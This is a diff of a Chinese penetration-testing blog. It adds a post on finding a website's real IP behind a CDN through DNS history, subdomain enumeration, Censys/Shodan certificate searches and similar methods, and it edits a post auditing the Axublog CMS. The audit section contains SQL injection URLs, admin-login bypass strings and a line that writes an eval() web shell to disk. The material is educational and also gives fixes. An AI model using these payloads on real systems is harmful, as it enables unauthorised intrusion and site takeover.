@@ -260,6 +260,261 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/" itemprop="url">绕过CDN查找ip方法总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-27T10:54:39+08:00">
+                2020-04-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p>
+<p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
+<p>​    <img src="https://bkimg.cdn.bcebos.com/pic/4610b912c8fcc3ce005c05d19c45d688d53f20b0?x-bce-process=image/watermark,g_7,image_d2F0ZXIvYmFpa2U4MA==,xp_5,yp_5" alt="img"></p>
+<p>比较常见的基于公有云的高可用架构，即：</p>
+<pre><code>域名--&gt;CDN，CDN--&gt;WAF，WAF--&gt;SLB，SLB--&gt;ECS</code></pre><p><strong>CDN对网站有什么好处?</strong></p>
+<p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p>
+<p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p>
+<p><strong>为什么我们需要绕过CDN？</strong></p>
+<pre><code>   对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p>
+<h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p>
+<p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p>
+<p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p>
+<h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p>
+<blockquote>
+<p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
+<p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p>
+<p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p>
+<p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p>
+</blockquote>
+<p>无 CDN 的示例：</p>
+<blockquote>
+<p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p>
+<p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p>
+</blockquote>
+<p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p>
+<h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p>
+<p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p>
+<p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p>
+<p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009230838766-860479177.png" alt="img"></p>
+<p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p>
+<p><strong>MX记录</strong></p>
+<p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p>
+<h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p>
+<p>下面介绍些常用的子域名查找的方法和工具：</p>
+<p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p>
+<p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009230922994-1826758810.png" alt="img"></p>
+<p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p>
+<p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p>
+<p>3）Google 搜索</p>
+<p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p>
+<p>4）各种子域名扫描器</p>
+<p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p>
+<p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231018377-2070670991.png" alt="img"></p>
+<p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入Python subdomainbrute.py baidu.com –full即可收集百度的子域名，如图：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231030794-1664451845.png" alt="img"></p>
+<p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p>
+<h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：<br><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231044976-1731199101.png" alt="img"> </p>
+<h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p>
+<p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p>
+<p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p>
+<p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p>
+<p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p>
+<p><strong>Censys证书查询搜索步骤如下：</strong></p>
+<p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p>
+<p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p>
+<p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
+<p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p>
+<p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p>
+<p><img src="https://www.fujieace.com/wp-content/uploads/2019/07/1077.jpg?x83086" alt="Censys空间搜索SHA1指纹"></p>
+<p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p>
+<h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p>
+<p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p>
+<p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p>
+<p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p>
+<p>80.http.get.headers.server:cloudflare</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://img2018.cnblogs.com/blog/1058583/201810/1058583-20181009231212219-1764707602.png" alt="img"></h3><h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
+<p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
+<p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p>
+<pre><code>ga（&#39;create&#39;，&#39;UA-93577176-1&#39;，&#39;auto&#39;）;</code></pre><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p>
+<p><strong>Shodan</strong></p>
+<p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p>
+<h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
+<p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p>
+<p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p>
+<p>这里推荐一个国外的多节点ping工具。</p>
+<p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p>
+<h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p>
+<p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p>
+<p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
+<h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
+<h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p>
+<p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p>
+<h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><pre><code>#添加一个server,在原server里绑定域名
+server  {
+        listen 80 default;
+        server_name _;
+        return 403;
+    }
+server {
+        listen       80;
+        server_name  www.demo.com;
+        .........</code></pre><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><pre><code>#在httpd.conf最后面加上
+
+&lt;VirtualHost 此处填写IP&gt;
+        ServerName 此处填写IP
+        &lt;Location /&gt;
+            Order Allow,Deny
+            Deny from all
+        &lt;/Location&gt;
+&lt;/VirtualHost&gt;
+
+&lt;VirtualHost 此处填写IP&gt;
+        DocumentRoot /var/www/html
+        ServerName   此处填写域名
+&lt;/VirtualHost&gt;</code></pre><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p>
+<p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p>
+<p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -279,7 +534,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/20/ssrf-lou-dong-xue-xi/" itemprop="url">SSRF漏洞学习</a></h1>
+                <a class="post-title-link" href="/2020/04/20/ssrf-lou-dong-xue-xi/" itemprop="url">我的SSRF漏洞学习</a></h1>
         
 
         <div class="post-meta">
@@ -465,6 +720,8 @@
 
 
 <h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p>
+<p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p>
+<p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>
 
           
         
@@ -1343,7 +1600,7 @@
         
           
             <h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><p><strong>转载自：</strong><a href="https://www.cnblogs.com/v01cano/p/12416366.html" target="_blank" rel="noopener">https://www.cnblogs.com/v01cano/p/12416366.html</a></p>
-<h4 id="1-前台数字型sql注入"><a href="#1-前台数字型sql注入" class="headerlink" title="1.前台数字型sql注入"></a>1.前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
+<h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
 <pre><code>&lt;?php
 header(&quot;Content-type:text/html; charset=utf-8&quot;);
 require(&quot;cmsconfig.php&quot;);
@@ -1381,7 +1638,7 @@ if(preg_match($a,$_SERVER[&#39;QUERY_STRING&#39;])==11 or preg_match($a,file_get
 <pre><code>?g=arthit&amp;id=-1%20%75nion%20%73elect%201,2,3,4,5,6,database(),8,9,10,11,12</code></pre><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p>
 <pre><code>$_SERVER[&#39;QUERY_STRING&#39;]=urldecode($_SERVER[&#39;QUERY_STRING&#39;]);</code></pre><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p>
 <pre><code>$id=intval($id);</code></pre><p>3.使用预编译技术和数据库进行交互。</p>
-<h3 id="2-任意文件上传漏洞"><a href="#2-任意文件上传漏洞" class="headerlink" title="2.任意文件上传漏洞"></a>2.任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p>
+<h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p>
 <h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p>
 <pre><code>&lt;?php
 @$g=$_GET[&quot;g&quot;];
@@ -1428,7 +1685,7 @@ else{echo&quot;保存文件失败！&quot;;}
 <pre><code>if($path!=&#39;../theme/default/about.mb&#39;){
     echo &#39;about.mb地址不正确&#39;;
     exit;
-}</code></pre><h3 id="3-后台生成about页面getshell"><a href="#3-后台生成about页面getshell" class="headerlink" title="3.后台生成about页面getshell"></a>3.后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p>
+}</code></pre><h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p>
 <h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><pre><code>ob_start();
 include($mb);
 $html = ob_get_contents ();
@@ -1448,48 +1705,43 @@ echo &#39;生成about.html成功: &lt;a target=blank href=&quot;&#39;.$cache.&#3
 <pre><code>&lt;?php 
 file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php @eval($_GET[&quot;a&quot;]); ?&gt;&#39;); 
 ?&gt;</code></pre><p>然后使用菜刀连接即可getshell。</p>
-<h4 id="4-后台登录处的sql注入漏洞"><a href="#4-后台登录处的sql注入漏洞" class="headerlink" title="4.后台登录处的sql注入漏洞"></a>4.后台登录处的sql注入漏洞</h4><p>漏洞分析：</p>
-<p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p>
+<h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303210401433-2074327058.png" alt="img"></p>
 <p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211200124-595595133.png" alt="img"></p>
-<p>漏洞利用：</p>
-<p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p>
+<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p>
 <pre><code>user:admin&#39; or 1=1#
 psw: 随意
 或者
 user: admin&#39; or 1#
 psw: 随意</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211645255-577074129.png" alt="img"></p>
-<h4 id="5-前台反射型xss漏洞"><a href="#5-前台反射型xss漏洞" class="headerlink" title="5.前台反射型xss漏洞"></a>5.前台反射型xss漏洞</h4><p>漏洞分析：</p>
-<p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p>
+<h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303232615102-565416911.png" alt="img"></p>
 <p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234054140-229902481.png" alt="img"></p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303233948167-467235758.png" alt="img"></p>
 <p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234320733-213715566.png" alt="img"></p>
-<p>漏洞利用：</p>
-<p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234506377-737313316.png" alt="img"></p>
-<h4 id="6-前台sql注入漏洞"><a href="#6-前台sql注入漏洞" class="headerlink" title="6.前台sql注入漏洞"></a>6.前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p>
+<h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234506377-737313316.png" alt="img"></p>
+<h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234835707-2141296773.png" alt="img"></p>
 <p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p>
 <p>漏洞利用：</p>
 <pre><code>执行如下poc时候返回正确结果：
 http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=1--+
 执行如下poc时候无结果返回：
